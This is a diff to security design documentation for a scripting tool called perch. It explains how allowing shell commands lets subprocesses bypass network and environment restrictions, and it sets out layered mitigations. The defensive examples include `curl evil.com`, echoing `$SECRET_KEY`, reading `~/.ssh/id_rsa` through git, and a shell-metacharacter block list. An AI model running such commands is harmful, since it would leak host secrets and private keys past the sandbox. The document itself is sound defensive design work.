@@ -130,6 +130,79 @@ These two flags are the **CLI side** of the trust model in §2.5. The author can
 
 ---
 
+## 0c. The subprocess escape hatch — and the layered defense
+
+The big honest gap in the restriction model: **once you allow `shell`, the subprocess can ignore the rest of your restrictions.** `--no-network` only fences perch's own `http_*` ops; `shell "curl evil.com"` is a different process and goes straight through. Same story for env vars: a bare `shell "echo $SECRET_KEY"` would happily print whatever the host shell process inherits.
+
+This is the same problem every shell-using tool has. perch ships three layers of mitigation; combine as needed.
+
+### Layer 1 — `--no-shell` (the bulletproof option)
+
+If you don't actually need shell, don't allow it. With `--no-shell` plus `--no-subprocess`, perch has no path to spawn an external process — every restriction (`--env`, `--no-network`, `--no-write`) is then airtight. This is the strongest posture and the right default for AI-agent surfaces and untrusted-file runs.
+
+### Layer 2 — subprocess env scrubbing (automatic with `--env`)
+
+When you set `--env A,B,C`, perch no longer hands `os.Environ()` to spawned processes. The subprocess inherits only the named vars. So even with `shell` allowed:
+
+```sh
+$ SECRET_KEY=hunter2 perch --env HOME -f run.perch deploy
+🔒 security: --env HOME
+SECRET_FROM_SUBPROCESS=               ← empty: $SECRET_KEY scrubbed
+```
+
+`bash` (the subprocess) literally cannot see `$SECRET_KEY`. This closes the most common leak — agent crafts a `shell` arg trying to exfiltrate a host secret — without you having to remove the `shell` op.
+
+User-declared globals with an uppercase initial (the explicit "export this as env" convention) still propagate, because those are values the file's author chose to expose.
+
+### Layer 3 — `--allow-bin` and `--no-shell-metachars` (bound which shell calls)
+
+When `shell` IS allowed but you want to bound *what* it can spawn:
+
+```sh
+# Only let shell invoke git or docker. The basename of the first
+# non-env-assignment token must be in the list.
+perch --allow-bin git,docker -f deploy.perch up
+
+# Reject pipes / redirects / && / ; / $(...) / backticks in shell args.
+# Stops shell-injection-style escapes inside an otherwise-allowed call.
+perch --no-shell-metachars -f deploy.perch up
+
+# Compose: only git OR docker, and only with simple invocations.
+perch --allow-bin git,docker --no-shell-metachars -f deploy.perch up
+```
+
+A blocked call cites the exact flag:
+
+```
+shell: binary "echo" is not in --allow-bin (allowed: git, docker)
+shell metachar "|" rejected by --no-shell-metachars
+```
+
+`--allow-bin` looks at the first non-env-assignment token's basename, so `FOO=bar /usr/local/bin/git status` matches `git` correctly. `--no-shell-metachars` lexes for `|`, `>`, `<`, `&`, `;`, `` ` ``, `$(`. Combined, "you can call git but not pipe it into rm" is enforceable.
+
+### What this still does NOT cover
+
+Honest about the limits:
+
+- **Reads from the FS by an allowed binary.** `shell "git diff ~/.ssh/id_rsa"` — the `git` binary is allowed, no metachars, and `git` legitimately reads files. The contents land in stdout. Mitigations: kernel-level FS namespacing (Linux mount namespaces, macOS sandbox-exec), which perch does NOT do today.
+- **Direct socket programming by an allowed binary.** `--no-network` only fences perch's own network ops; an allowed `curl` or `nc` doesn't respect it. Mitigations: kernel-level network namespaces, or running perch under firejail / bubblewrap.
+- **An allowed binary that escalates** (`sudo`, `pkg_install` paths). Mitigations: the `no_sudo` modifier in the §3+ file-side sandbox spec.
+- **Determined attacker writing in capy.** A malicious `.perch` file can do anything any allowed op permits. perch's threat model assumes you've code-reviewed the file (or are running it with the strictest available flags); `--check` makes that review tractable.
+
+For genuinely adversarial input — running untrusted `.perch` files — the right answer is **Layer 1**: keep `--no-shell` on. Everything else is best-effort hardening for the "I want shell, but constrained" case.
+
+### Recommended postures
+
+| Caller | Recommended flags |
+|---|---|
+| You, local dev | none (trusted) |
+| Internal team CLI shipped as binary | `--env A,B,C` to scope env |
+| Web UI for non-engineers (`--server`) | `--no-shell-metachars --allow-bin <whitelist>` |
+| MCP server for AI agents | `--no-shell --no-subprocess --no-network --no-write --env A,B` (Layer 1) |
+| Running a `.perch` from a stranger | same as MCP, plus the future `--untrusted` preset (§7) |
+
+---
+
 ## 1. Why we need this
 
 ### 1.1 The threat model
